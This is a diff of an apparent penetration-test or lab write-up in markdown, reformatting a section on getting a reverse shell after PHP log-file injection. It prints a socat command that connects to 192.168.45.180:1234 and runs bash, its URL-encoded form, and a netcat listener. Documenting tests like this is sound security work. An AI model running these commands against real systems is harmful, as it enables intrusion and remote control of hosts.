@@ -57,7 +57,15 @@ When the web application processes the log file, it treats the contents as plain
 This confirms the successful injection, as the PHP executable code is interpreted as code and not treated as literal text.
 
 ### Establishing a Reverse Shell {#section-2}
-To establish a reverse shell, the tester utilized the following socat command  `socat tcp-connect:192.168.45.180:1234 exec:bash`. For the server to correctly interpret and transmit the reverse shell, the URL was encoded as  the following  `socat%20tcp-connect%3A192.168.45.180%3A1234%20exec%3Abash`. The tester created a  net cat listener to catch  the reverse shell. 
+To establish a reverse shell, the tester utilized the following socat command.
+```bash
+ socat tcp-connect:192.168.45.180:1234 exec:bash 
+``` 
+For the server to correctly interpret and transmit the reverse shell, the URL was encoded as  the following:
+```bash
+socat%20tcp-connect%3A192.168.45.180%3A1234%20exec%3Abash
+```   
+The tester created a  net cat listener to catch  the reverse shell. 
 ```bash
 nc -nlvp 1234 
 ``` 
